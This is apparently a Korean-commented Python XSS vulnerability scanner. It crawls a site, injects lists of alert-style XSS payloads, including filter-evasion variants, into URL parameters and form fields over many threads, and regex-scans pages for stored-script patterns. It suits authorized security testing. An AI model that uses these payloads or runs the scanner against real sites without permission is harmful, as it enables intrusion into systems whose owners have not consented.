import requests
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, urljoin
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Set
from collections import deque
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed  # 멀티스레딩 필수 모듈

# ============== XSS 페이로드 및 패턴 데이터 ==============

XSS_PAYLOADS_QUICK = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    'javascript:alert(1)',
    '<ScRiPt>alert(1)</ScRiPt>',
]

XSS_PAYLOADS_FULL = [
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<div onmouseover=alert(1)>test</div>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    'javascript:alert(1)',
    'javascript:alert(String.fromCharCode(88,83,83))',
    '<ScRiPt>alert(1)</ScRiPt>',
    '<IMG SRC="javascript:alert(1)">',
    '<SVG/ONLOAD=alert(1)>',
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<iframe src="javascript:alert(1)">',
    '<script>alert`1`</script>',
]

STORED_XSS_PATTERNS = [
    (r'<script[^>]*>[\s\S]*?alert\s*\(', 'alert() 스크립트'),
    (r'<script[^>]*>[\s\S]*?console\s*\.\s*log\s*\(', 'console.log() 스크립트'),
    (r'<script[^>]*>[\s\S]*?document\s*\.\s*cookie', '쿠키 접근 스크립트'),
    (r'<script[^>]*>[\s\S]*?document\s*\.\s*location', '리다이렉트 스크립트'),
    (r'<script[^>]*>[\s\S]*?document\s*\.\s*write', 'document.write() 스크립트'),
    (r'<script[^>]*>[\s\S]*?eval\s*\(', 'eval() 스크립트'),
    (r'<script[^>]*>[\s\S]*?window\s*\.\s*location', 'window.location 스크립트'),
    (r'<img[^>]*\sonerror\s*=', 'img onerror XSS'),
    (r'<img[^>]*\sonload\s*=', 'img onload XSS'),
    (r'<svg[^>]*\sonload\s*=', 'svg onload XSS'),
    (r'<body[^>]*\sonload\s*=', 'body onload XSS'),
    (r'<input[^>]*\sonfocus\s*=', 'input onfocus XSS'),
    (r'<[a-z]+[^>]*\sonerror\s*=', 'onerror 이벤트'),
    (r'<[a-z]+[^>]*\sonload\s*=', 'onload 이벤트'),
    (r'<[a-z]+[^>]*\sonclick\s*=', 'onclick 이벤트'),
    (r'<[a-z]+[^>]*\sonmouseover\s*=', 'onmouseover 이벤트'),
    (r'href\s*=\s*["\']?\s*javascript\s*:', 'javascript: href'),
    (r'src\s*=\s*["\']?\s*javascript\s*:', 'javascript: src'),
    (r'<iframe[^>]*\ssrc\s*=\s*["\']?(?!https?://)', '의심스러운 iframe'),
    (r'XSS[_\-]?(ATTACK|TEST|PAYLOAD|SUCCESS)', 'XSS 테스트 흔적'),
    (r'<img[^>]*src\s*=\s*["\']?[x1#]["\']?[^>]*onerror', '깨진 이미지 XSS'),
]

SAFE_SCRIPT_PATTERNS = [
    r'<script[^>]+src\s*=\s*["\']https?://cdn\.cloudflare\.com',
    r'<script[^>]+src\s*=\s*["\']https?://cdnjs\.cloudflare\.com',
    r'<script[^>]+src\s*=\s*["\']https?://code\.jquery\.com',
    r'<script[^>]+src\s*=\s*["\']https?://unpkg\.com',
    r'<script[^>]+src\s*=\s*["\']https?://cdn\.jsdelivr\.net',
]

# ============== 데이터 클래스 ==============

@dataclass
class PageInfo:
    url: str
    forms: List[Dict] = field(default_factory=list)
    params: Dict = field(default_factory=dict)
    links: Set[str] = field(default_factory=set)

@dataclass
class StoredXSSResult:
    url: str
    pattern_name: str
    matched_content: str
    line_number: int = 0

@dataclass
class ScanResult:
    url: str
    parameter: str
    payload: str
    reflected: bool
    vulnerable: bool
    response_snippet: Optional[str] = None
    status_code: int = 0

# ============== 로직 클래스 ==============

class SiteCrawler:
    def __init__(self, base_url: str, cookies: Dict = None, max_pages: int = 50, max_depth: int = 3, 
                 timeout: int = 10, callback=None, delay: float = 0.05): # Delay 대폭 감소
        self.base_url = self._normalize_url(base_url)
        self.max_pages = max_pages
        self.max_depth = max_depth
        self.timeout = timeout
        self.callback = callback
        self.delay = delay
        
        parsed = urlparse(self.base_url)
        self.domain = parsed.netloc
        self.scheme = parsed.scheme
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        if cookies:
            self.session.cookies.update(cookies)
            self.session.headers.update({'Cookie': '; '.join([f"{k}={v}" for k, v in cookies.items()])})
        
        self.visited: Set[str] = set()
        self.pages: List[PageInfo] = []
        self.stop_flag = False
    
    @staticmethod
    def _normalize_url(url: str) -> str:
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        return url.rstrip('/')
    
    def _is_same_domain(self, url: str) -> bool:
        try:
            parsed = urlparse(url)
            return parsed.netloc == self.domain or parsed.netloc == ''
        except:
            return False
    
    def _normalize_link(self, link: str, current_url: str) -> Optional[str]:
        try:
            link = link.split('#')[0]
            if not link:
                return None
            if link.startswith('//'):
                full_url = f"{self.scheme}:{link}"
            elif link.startswith('/'):
                full_url = f"{self.scheme}://{self.domain}{link}"
            elif link.startswith('http'):
                full_url = link
            else:
                full_url = urljoin(current_url, link)
            
            parsed = urlparse(full_url)
            normalized = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            if parsed.query:
                params = parse_qs(parsed.query)
                param_names = sorted(params.keys())
                if param_names:
                    normalized += f"?{'&'.join(f'{k}=' for k in param_names)}"
            return normalized
        except:
            return None
    
    def log(self, message: str, level: str = 'info'):
        if self.callback:
            self.callback(message, level)
    
    def fetch_page(self, url: str) -> Optional[str]:
        try:
            # 타임아웃을 줄여서 속도 향상
            response = self.session.get(url, timeout=self.timeout)
            if 'text/html' in response.headers.get('Content-Type', ''):
                return response.text
        except:
            pass
        return None
    
    def parse_page(self, url: str, html: str) -> PageInfo:
        soup = BeautifulSoup(html, 'html.parser')
        params = parse_qs(urlparse(url).query)
        forms = []
        found_inputs = set()
        
        for form in soup.find_all('form'):
            action = form.get('action') or url
            method = form.get('method', 'get').lower()
            if action.startswith('/'):
                action = f"{self.scheme}://{self.domain}{action}"
            elif not action.startswith('http'):
                action = urljoin(url, action)
            
            form_inputs = []
            for tag in form.find_all(['input', 'textarea', 'select']):
                name = tag.get('name')
                if not name: continue
                input_info = {'name': name, 'type': tag.get('type', 'text'), 'value': tag.get('value', '')}
                form_inputs.append(input_info)
                found_inputs.add(tag)
            
            forms.append({'action': action, 'method': method, 'inputs': form_inputs})
            
        orphan_inputs = []
        for tag in soup.find_all(['input', 'textarea', 'select']):
            if tag not in found_inputs and tag.get('name'):
                orphan_inputs.append({'name': tag.get('name'), 'type': tag.get('type', 'text'), 'value': tag.get('value', '')})
        
        if orphan_inputs:
            forms.append({'action': url, 'method': 'get', 'inputs': orphan_inputs})
            
        normalized_links = set()
        for a in soup.find_all('a', href=True):
            link = a['href']
            if link.startswith(('#', 'javascript:', 'mailto:', 'tel:')): continue
            normalized = self._normalize_link(link, url)
            if normalized and self._is_same_domain(normalized):
                normalized_links.add(normalized)
        
        return PageInfo(url=url, forms=forms, params=params, links=normalized_links)
    
    def crawl(self) -> List[PageInfo]:
        self.visited = set()
        self.pages = []
        self.stop_flag = False
        queue = deque([(self.base_url, 0)])
        self.visited.add(self._normalize_link(self.base_url, self.base_url))
        self.log(f"🌐 크롤링 시작: {self.base_url}", 'info')
        
        while queue and len(self.pages) < self.max_pages and not self.stop_flag:
            url, depth = queue.popleft()
            if depth > self.max_depth: continue
            
            html = self.fetch_page(url)
            if not html: continue
            
            page_info = self.parse_page(url, html)
            self.pages.append(page_info)
            
            forms_count = len(page_info.forms)
            params_count = len(page_info.params)
            self.log(f"  [{len(self.pages)}/{self.max_pages}] {url[:60]}...", 'info')
            if forms_count or params_count:
                self.log(f"       폼: {forms_count}, 파라미터: {params_count}", 'success')
            
            if self.callback:
                progress = int((len(self.pages) / self.max_pages) * 100)
                self.callback(None, 'crawl_progress', progress)
            
            for link in page_info.links:
                normalized = self._normalize_link(link, url)
                if normalized and normalized not in self.visited:
                    self.visited.add(normalized)
                    queue.append((link, depth + 1))
            
            # 딜레이 최소화
            if self.delay > 0:
                time.sleep(self.delay)
        
        self.log(f"\n✅ 크롤링 완료: {len(self.pages)}개 페이지 발견", 'success')
        return self.pages
    
    def stop(self):
        self.stop_flag = True

class XSSScanner:
    def __init__(self, timeout: int = 10, cookies: Dict = None, callback=None, threads: int = 20):
        self.timeout = timeout
        self.callback = callback
        self.threads = threads  # 스레드 개수 설정
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        
        # 커넥션 풀 크기 증설 (병렬 요청을 위해)
        adapter = requests.adapters.HTTPAdapter(pool_connections=threads, pool_maxsize=threads)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        
        if cookies:
            self.session.cookies.update(cookies)
            self.session.headers.update({'Cookie': '; '.join([f"{k}={v}" for k, v in cookies.items()])})
            
        self.results = []
        self.stored_xss_results = []
        self.stop_flag = False
    
    def log(self, message: str, level: str = 'info'):
        if self.callback: self.callback(message, level)
    
    # ... (analyze_stored_xss, scan_page_content 메서드는 기존과 동일, 생략 없이 포함) ...
    def analyze_stored_xss(self, url: str, html: str) -> List[StoredXSSResult]:
        results = []
        cleaned_html = html
        for safe_pattern in SAFE_SCRIPT_PATTERNS:
            cleaned_html = re.sub(safe_pattern, '[SAFE_EXTERNAL_SCRIPT]', cleaned_html, flags=re.IGNORECASE)
        lines = html.split('\n')
        
        for pattern, pattern_name in STORED_XSS_PATTERNS:
            try:
                matches = re.finditer(pattern, cleaned_html, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    matched_text = match.group(0)
                    if '[SAFE_EXTERNAL_SCRIPT]' in matched_text: continue
                    line_num = 0
                    for i, line in enumerate(lines):
                        if matched_text[:30] in line:
                            line_num = i + 1; break
                    display_content = matched_text[:100] + '...' if len(matched_text) > 100 else matched_text
                    if not any(r.matched_content == display_content and r.url == url for r in results):
                        results.append(StoredXSSResult(url, pattern_name, display_content, line_num))
            except re.error: pass
        
        table_patterns = [
            (r'<t[dh][^>]*>.*?<script.*?</script>.*?</t[dh]>', '테이블 셀 내 스크립트'),
            (r'<t[dh][^>]*>.*?onerror\s*=.*?</t[dh]>', '테이블 셀 내 onerror'),
            (r'<li[^>]*>.*?<script.*?</script>.*?</li>', '리스트 내 스크립트'),
        ]
        for pattern, pattern_name in table_patterns:
            try:
                matches = re.finditer(pattern, html, re.IGNORECASE | re.DOTALL)
                for match in matches:
                    matched_text = match.group(0)
                    display_content = matched_text[:100] + '...' if len(matched_text) > 100 else matched_text
                    if not any(r.matched_content == display_content for r in results):
                        results.append(StoredXSSResult(url, pattern_name, display_content, 0))
            except re.error: pass
            
        return results

    def scan_page_content(self, pages: List[PageInfo]) -> List[StoredXSSResult]:
        self.stored_xss_results = []
        self.log(f"\n🔎 저장된 XSS 분석 시작 ({len(pages)}개 페이지)", 'info')
        
        # 콘텐츠 분석은 병렬 처리가 크지 않아 순차적으로 하되, stop check 강화
        for i, page in enumerate(pages):
            if self.stop_flag: break
            try:
                response = self.session.get(page.url, timeout=self.timeout)
                results = self.analyze_stored_xss(page.url, response.text)
                if results:
                    self.log(f"  [{i+1}/{len(pages)}] {page.url[:50]}...", 'info')
                    for r in results:
                        self.log(f"    ⚠️ {r.pattern_name}: {r.matched_content[:50]}...", 'danger')
                    self.stored_xss_results.extend(results)
                if self.callback:
                    progress = int(((i + 1) / len(pages)) * 100)
                    self.callback(None, 'content_progress', progress)
            except: pass
        
        if self.stored_xss_results: self.log(f"\n⚠️ 저장된 XSS {len(self.stored_xss_results)}개 발견!", 'danger')
        else: self.log(f"\n✅ 저장된 XSS 패턴 없음", 'success')
        return self.stored_xss_results
    
    def check_reflection(self, response_text: str, payload: str) -> tuple:
        if payload in response_text:
            idx = response_text.find(payload)
            start = max(0, idx - 30)
            end = min(len(response_text), idx + len(payload) + 30)
            return True, response_text[start:end]
        return False, None
    
    def check_vulnerability(self, response_text: str, payload: str) -> bool:
        patterns = [
            r'<script[^>]*>', r'onerror\s*=', r'onload\s*=', r'onclick\s*=', 
            r'onmouseover\s*=', r'onfocus\s*=', r'javascript:', r'<img[^>]+onerror', r'<svg[^>]+onload'
        ]
        for pattern in patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                if re.search(pattern, payload, re.IGNORECASE): return True
        return False
    
    def inject_url_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        new_query = urlencode(params, doseq=True)
        return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
    
    # 개별 스캔 작업 (결과를 리턴하도록 수정)
    def scan_url_param(self, url: str, param: str, payload: str) -> ScanResult:
        if self.stop_flag: return None
        injected_url = self.inject_url_param(url, param, payload)
        try:
            response = self.session.get(injected_url, timeout=self.timeout)
            reflected, snippet = self.check_reflection(response.text, payload)
            vulnerable = reflected and self.check_vulnerability(response.text, payload)
            return ScanResult(injected_url, param, payload, reflected, vulnerable, snippet, response.status_code)
        except Exception as e:
            return ScanResult(injected_url, param, payload, False, False, f"Error: {str(e)[:30]}")
    
    # 개별 폼 스캔 작업 (결과를 리턴하도록 수정)
    def scan_form(self, form: Dict, payload: str, input_field: Dict) -> ScanResult:
        if self.stop_flag: return None
        data = {}
        for inp in form['inputs']:
            data[inp['name']] = payload if inp['name'] == input_field['name'] else inp.get('value', 'test')
        try:
            if form['method'] == 'post':
                response = self.session.post(form['action'], data=data, timeout=self.timeout)
            else:
                response = self.session.get(form['action'], params=data, timeout=self.timeout)
            reflected, snippet = self.check_reflection(response.text, payload)
            vulnerable = reflected and self.check_vulnerability(response.text, payload)
            return ScanResult(form['action'], f"{input_field['name']} ({form['method'].upper()})", payload, reflected, vulnerable, snippet, response.status_code)
        except Exception as e:
            return ScanResult(form['action'], input_field['name'], payload, False, False, f"Error: {str(e)[:30]}")
    
    def scan_pages(self, pages: List[PageInfo], quick_mode: bool = False) -> List[ScanResult]:
        self.results = []
        self.stop_flag = False
        payloads = XSS_PAYLOADS_QUICK if quick_mode else XSS_PAYLOADS_FULL
        
        # 총 작업 개수 계산
        total_tasks = sum(len(p.params) * len(payloads) for p in pages) + \
                      sum(len(f['inputs']) * len(payloads) for p in pages for f in p.forms)
        
        if total_tasks == 0:
            self.log("⚠️ 스캔할 입력필드가 없습니다.", 'warning')
            return []
        
        self.log(f"\n🚀 고속 XSS 스캔 시작 (멀티스레드: {self.threads}, 총 {total_tasks}개 테스트)", 'info')
        
        completed_tasks = 0
        
        # 스레드 풀 실행기 사용
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            # 작업 등록 (Submission)
            for page in pages:
                if self.stop_flag: break
                
                # 1. URL 파라미터 작업 등록
                for param in page.params:
                    for payload in payloads:
                        futures.append(executor.submit(self.scan_url_param, page.url, param, payload))
                
                # 2. 폼 작업 등록
                for form in page.forms:
                    for input_field in form['inputs']:
                        for payload in payloads:
                            futures.append(executor.submit(self.scan_form, form, payload, input_field))
            
            # 작업 완료 처리 (As Completed)
            for future in as_completed(futures):
                if self.stop_flag:
                    self.log("⏹ 사용자 요청으로 스캔을 중단합니다...", 'warning')
                    break
                
                result = future.result()
                completed_tasks += 1
                
                if result:
                    self.results.append(result)
                    
                    # 로그 출력 (취약점 발견 시에만 강조, 나머지는 생략하여 속도 향상)
                    if result.vulnerable:
                        self.log(f"  🔴 취약점! [{result.parameter}] {result.payload[:30]}...", 'danger')
                    elif result.reflected:
                        self.log(f"  🟡 반사: [{result.parameter}]", 'warning')
                
                # 진행률 업데이트 (UI 부하를 줄이기 위해 1% 단위 or 10건 단위로 업데이트 권장하나 여기선 매번 호출하되 main_gui가 처리)
                if self.callback:
                    progress = int((completed_tasks / total_tasks) * 100)
                    self.callback(None, 'scan_progress', progress)

        return self.results
    
    def stop(self):
        self.stop_flag = True